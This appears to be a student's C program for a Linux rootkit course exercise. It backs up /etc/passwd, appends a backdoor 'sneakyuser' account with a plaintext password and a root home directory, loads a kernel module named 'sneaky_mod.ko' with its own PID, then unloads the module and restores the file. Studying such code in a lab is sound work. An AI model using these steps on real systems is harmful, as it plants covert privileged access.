#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// Step 1: print its own process ID to the screen
void print_info() { printf("sneaky_process pid = %d\n", getpid()); }

// Step 2: insert a line to passwd file
void backup_passwd() {
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
}

// Step 3: load module
void load_module() {
  char cmd[100];
  sprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
  system(cmd);
}

// Step 4:
void interact() {
  char ch;
  while ((ch = getchar()) != 'q') {
  }
}

// Step 5: unload module
void unload_module() { system("rmmod sneaky_mod"); }

// Step 6: restore the /etc/passwd file
void restore_passwd() {
  system("cp /tmp/passwd /etc");
  system("rm /tmp/passwd"); // no required by assignment
}

int main() {
  print_info();
  backup_passwd();
  load_module();
  interact();
  unload_module();
  restore_passwd();
  return EXIT_SUCCESS;
}
